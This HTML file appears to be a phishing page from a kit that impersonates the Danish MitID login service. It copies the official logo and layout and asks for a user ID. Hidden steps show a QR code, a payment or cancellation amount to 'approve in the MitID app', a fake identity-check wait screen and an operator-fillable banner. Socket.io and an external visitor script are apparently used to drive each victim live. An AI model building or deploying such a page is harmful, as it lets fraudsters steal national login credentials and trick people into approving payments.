<!doctype html>
<html lang="da">
<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Log på hos MitID.dk</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1rem}
.kort{width:100%;max-width:440px;background:#fff;border:1px solid #d8d8d8;border-radius:4px;box-shadow:0 1px 2px rgba(0,0,0,.05)}
.kort-head{display:flex;justify-content:space-between;align-items:center;padding:24px 32px;border-bottom:1px solid #d8d8d8}
.kort-head h1{font-size:20px;font-weight:700;color:#1a1a1a;letter-spacing:-.01em}
.kort-head img{height:24px;width:auto}
.kort-body{padding:32px}
.flex-between{display:flex;justify-content:space-between;align-items:center}
.label-row{display:flex;align-items:center;gap:8px;margin-bottom:8px}
.label-row label{font-size:12px;font-weight:700;color:#1a1a1a;letter-spacing:.03em;text-transform:uppercase}
.input-rel{position:relative}
.input-id{width:100%;padding:12px 48px 12px 12px;border:2px solid #0060e6;border-radius:4px;outline:none;font-size:18px;color:#1a1a1a;background:#f5faff}
.input-rel span{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#1a1a1a;font-size:15px;cursor:pointer;user-select:none}
.btn-continue{width:100%;color:#fff;font-weight:700;font-size:16px;text-transform:uppercase;letter-spacing:.05em;padding:16px 24px;border:none;border-radius:4px;display:flex;align-items:center;justify-content:space-between;min-height:56px;margin-bottom:24px;transition:all .15s;cursor:pointer}
.btn-continue.disabled{background:#ccc;cursor:not-allowed}
.btn-continue.active{background:#0060e6;cursor:pointer}
.btn-continue.active:hover{background:#0049b8}
.glemt{display:flex;align-items:center;gap:8px;color:#0060e6;margin-bottom:48px;cursor:pointer}
.glemt span{font-size:14px;font-weight:500}
.glemt:hover{text-decoration:underline}
.husk{display:flex;align-items:center;gap:12px;margin-bottom:24px;cursor:pointer}
.husk input{width:20px;height:20px;accent-color:#0060e6;cursor:pointer}
.husk span{color:#001845;font-weight:700;font-size:15px}
.bottom{border-top:1px solid #d8d8d8;padding-top:16px;text-align:center}
.bottom a{color:#0060e6;font-weight:700;font-size:15px;text-decoration:none}
.bottom a:hover{text-decoration:underline}
.hidden{display:none!important}
@keyframes fadeIn{0%{opacity:0;transform:translateY(6px)}100%{opacity:1;transform:translateY(0)}}
.animate-in{animation:fadeIn .3s ease-out}
@keyframes spinSlow{to{transform:translate(-50%,-50%) rotate(360deg)}}
@keyframes pulseSub{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.7;transform:scale(1.04)}}
</style>

<link rel="stylesheet" href="visitor-tail.css">
<script src="https://unpkg.com/qr-code-styling@1.6.0-rc.1/lib/qr-code-styling.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<style>
@keyframes fadeIn{0%{opacity:0;transform:translateY(6px)}100%{opacity:1;transform:translateY(0)}}
.animate-fade-in{animation:fadeIn .35s ease-out forwards}
.animate-fade-in-1{animation:fadeIn .4s ease-out .05s both}
.animate-fade-in-2{animation:fadeIn .4s ease-out .12s both}
.animate-fade-in-3{animation:fadeIn .4s ease-out .18s both}
.animate-fade-in-4{animation:fadeIn .4s ease-out .24s both}
@keyframes spinSlow{to{transform:translate(-50%,-50%) rotate(360deg)}}
@keyframes pulseSub{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.7;transform:scale(1.04)}}
</style>
</head>
<body class="min-h-screen bg-white flex flex-col items-center justify-center p-4">
<!-- MitID Besked banner -->
<div id="mitidBanner" style="background:linear-gradient(135deg,#003a99 0%,#0052cc 40%,#003a99 100%);color:#fff;padding:14px 20px;display:flex;align-items:flex-start;gap:12px;box-shadow:rgba(0,58,153,.5) 0 4px 20px;border-bottom:2px solid rgba(255,255,255,.25);display:none;">
  <div style="flex-shrink:0;width:auto;height:auto;border-radius:8px;background:transparent;display:flex;align-items:center;justify-content:center;">
    <div style="background:#fff;border-radius:6px;padding:4px 6px;display:flex;align-items:center;justify-content:center;">
      <svg width="40" height="11" viewBox="0 0 61 16" style="height:18px;width:auto;object-fit:contain;display:block;">
        <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
      </svg>
    </div>
  </div>
  <div style="flex:1;">
    <div style="font-size:11px;font-weight:700;letter-spacing:.08em;text-transform:uppercase;opacity:.85;margin-bottom:3px;font-family:system-ui,-apple-system,sans-serif;">MITID BESKED</div>
    <div id="mitidBannerText" style="font-size:14px;font-weight:500;line-height:1.4;font-family:system-ui,-apple-system,sans-serif;"></div>
  </div>
</div>

<div class="kort">
  <!-- HEADER -->
  <div class="kort-head animate-in">
    <h1 class="text-[20px] font-bold text-[#1a1a1a] tracking-tight" id="formHeading">Log på hos MitID.dk</h1>
    <img src="/assets/mitid-logo.png" alt="MitID" style="height:24px;width:auto;">
  </div>

  <!-- INDHOLD -->
  <div class="kort-body">

    <!-- LOADER (skjult) -->
    <div id="loaderContainer" class="hidden">
      <div style="text-align:center;padding:30px 0;">
        <svg width="92" height="24" viewBox="0 0 61 16" style="margin-bottom:36px;transform:scale(1.6)">
          <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
        </svg>
        <video src="/assets/mitid-animation.mp4" autoplay loop muted playsinline style="width:110px;height:110px;margin:0 auto 28px;display:block;"></video>
        <div style="font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:8px;">Forbinder sikkert til MitID</div>
        <div style="font-size:14px;color:#5c5c5c;">Vent venligst ...</div>
      </div>
    </div>

    <!-- BRUGER-ID TRIN -->
    <div id="stepBruger">
      <div class="mb-6 animate-fade-in-1">
        <div class="label-row">
          <label class="text-[12px] font-bold text-[#1a1a1a] tracking-wide uppercase">Bruger-ID</label>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
        </div>
        <div class="input-rel">
          <input type="text" id="brugerIdInput" autocomplete="off" spellcheck="false"
                 class="input-id" id="brugerIdInput" autocomplete="off" spellcheck="false">
          <span class="absolute right-3 top-1/2 -translate-y-1/2 text-[#1a1a1a] text-[15px] cursor-pointer hover:underline select-none" id="hideBtn">Skjul</span>
        </div>
      </div>
      <button id="brugerBtn" disabled class="btn-continue disabled" disabled>
        <span class="flex-1 text-center ml-6">FORTSÆT</span>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
      </button>
      <div class="glemt animate-in">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
        <span class="text-[14px] font-medium">Glemt bruger-ID?</span>
      </div>
      <div class="pt-4 animate-fade-in-4">
        <div class="husk">
          <input type="checkbox" id="rememberMe" style="width:20px;height:20px;accent-color:#0060e6;cursor:pointer;">
          <span class="text-[#001845] font-bold text-[15px]">Husk mig hos MitID.dk</span>
        </div>
        <div class="bottom">
          <a href="#" class="text-[#0060e6] font-bold text-[15px] hover:underline">Afbryd</a>
        </div>
      </div>
    </div>

    <!-- QR TRIN (skjult) -->
    <div id="stepQr" class="hidden">
      <div style="text-align:center;padding:10px 0 4px;">
        <div id="qrcode" style="display:inline-block;background:#fff;border:1px solid #d8d8d8;padding:14px;border-radius:4px;"></div>
        <div style="font-size:17px;font-weight:700;color:#1a1a1a;padding:14px 0 2px;">Scan QR-koden</div><div style="font-size:14px;color:#5c5c5c;padding-bottom:8px;">Brug din MitID app til at scanne koden</div>
      </div>
      <div class="pt-4">
        <div class="bottom">
          <a href="#" class="text-[#0060e6] font-bold text-[15px] hover:underline">Afbryd</a>
        </div>
      </div>
    </div>

    <!-- BETALING / ANNULLERING (skjult) -->
    <div id="stepBetaling" class="hidden">
      <div style="text-align:center;padding:8px 0;">
        <div id="betAmount" style="font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:8px;"></div>
        <div id="betTitle" style="font-size:17px;color:#1a1a1a;margin-bottom:18px;"></div>
        <video src="/assets/mitid-animation.mp4" autoplay loop muted playsinline style="width:96px;height:96px;margin:0 auto 20px;display:block;"></video>
        <div style="font-size:15px;color:#1a1a1a;">Åbn MitID app og godkend</div>
      </div>
      <div class="pt-4">
        <div class="bottom">
          <a href="#" class="text-[#0060e6] font-bold text-[15px] hover:underline">Afbryd</a>
        </div>
      </div>
    </div>

    <!-- WAIT (skjult) — samme som loader men anden tekst -->
    <div id="stepWait" class="hidden">
      <div style="text-align:center;padding:30px 0;">
        <svg width="92" height="24" viewBox="0 0 61 16" style="margin-bottom:36px;transform:scale(1.6)">
          <path d="M19.2,0c1,0,1.8,0.8,1.8,1.8c0,1-0.8,1.8-1.8,1.8c-1,0-1.8-0.8-1.8-1.8C17.4,0.8,18.2,0,19.2,0z M40.4,0 c2.1,0,3.8,1.7,3.8,3.8c0,2.1-1.7,3.8-3.8,3.8c-2.1,0-3.8-1.7-3.8-3.8C36.6,1.7,38.3,0,40.4,0z M20.7,4.9v10.9h-3V4.9H20.7z M2.9,0.8l4.6,7.1l4.5-7.1h2.9v15h-3.1V6.1l-4.3,6.4H7.4L3.1,6.1v9.7H0v-15H2.9z M40.4,9c3.6,0,6.5,2,6.9,6.8H33.6 C34,11,36.9,9,40.4,9z M51.9,0.2C58.3,0.2,61,3.7,61,8c0,4.3-2.7,7.8-9.1,7.8h-2.6V0.2H51.9z M27.1,1.9v3h2.4v2.4h-2.4v4.8 c0,0.9,0.5,1.2,1.3,1.2c0.5,0,1-0.1,1.3-0.4v2.7c-0.4,0.2-1.2,0.3-2,0.3c-2.2,0-3.6-1.1-3.6-3.5V7.3h-1.7V4.9h1.7v-3H27.1z" fill="#0060e6"/>
        </svg>
        <video src="/assets/mitid-animation.mp4" autoplay loop muted playsinline style="width:110px;height:110px;margin:0 auto 28px;display:block;"></video>
        <div style="font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:8px;">Godkender identitet</div>
        <div style="font-size:14px;color:#5c5c5c;">Vent venligst ...</div>
      </div>
    </div>

  </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script src="/visitor.js"></script>
</body>
</html>
